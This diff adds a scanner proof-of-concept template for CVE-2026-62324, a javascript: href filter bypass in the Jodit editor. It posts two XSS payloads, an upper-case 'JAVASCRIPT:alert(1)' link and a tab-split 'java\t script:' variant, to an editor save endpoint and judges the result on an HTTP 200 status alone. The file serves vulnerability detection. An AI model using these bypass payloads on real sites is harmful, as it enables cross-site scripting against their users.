@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = '检测 Jodit 编辑器 sanitizeHTMLElement 中 href 属性 javascript: 协议过滤绕过漏洞。通过发送包含大小写变体（JAVASCRIPT:）或控制字节前缀（java\tscript:）的 javascript: URL 的编辑器内容，验证服务端是否未正确过滤恶意 href 链接。'
+id = "POC-AVE-2026-0912"
+name = "CVE-2026-62324 PoC"
+severity = "medium"
+tags = ["ave-2026-0912"]
+vuln_id = [
+    "CVE-2026-62324",
+    "AVE-2026-0912",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/editor/save"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"content":"<a href=\"JAVASCRIPT:alert(1)\">click</a>"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/editor/save"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"content":"<a href=\"java\t script:alert(1)\">click</a>"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
